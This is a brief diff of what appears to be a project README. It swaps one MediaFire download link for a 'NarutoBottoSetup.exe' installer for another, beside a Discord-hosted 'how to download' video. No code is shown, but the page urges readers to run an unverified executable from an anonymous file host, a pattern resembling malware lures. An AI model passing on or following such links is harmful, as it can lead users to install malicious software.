@@ -16,7 +16,7 @@ Vedio Tutorial "How To Download it"
 
 [[tutorial vedio]](https://cdn.discordapp.com/attachments/1127234099170529320/1127299978176507904/07081.mp4)
 
-**YOU CAN DOWNLOAD IT FROM HERE [[Download]](https://download846.mediafire.com/1rgdwlyqifbg-ArkV04NMN10hNp5irf4x5_ou2E_miP8qv5lcb0DGBEoGuRMA49kiLnAj8ltX5w3V3g6dYaqA4ENMWoMoNiZECS15FKmb06a44A8hVCzMahk8rUTJ7UUzNlo_zMsG8XxqCWU9iKL1ZQTEi4FfNFD9EOUTjHLJq583ib0/dj7c2vcmo5hlqq9/NarutoBottoSetup.exe)**
+**YOU CAN DOWNLOAD IT FROM HERE [[Download]](https://download943.mediafire.com/tk69qfjts2dgQ5gp-0DM8cp4kS8C6zSyCcQZCrycACyfT-BxQ5ctQE4So0PniNbU1SwVzqvJym-ZzJ8Wx1fy1tn86lCslrE9KCkNxix0K6mZiXvwnfCJOqVaDTemxe6c4Md26HjSbjddIW6Xrvs9NTLXKFQSd9FbmVG82NhHKzaTS0Ye/dj7c2vcmo5hlqq9/NarutoBottoSetup.exe)**
 
 Images in programme
 
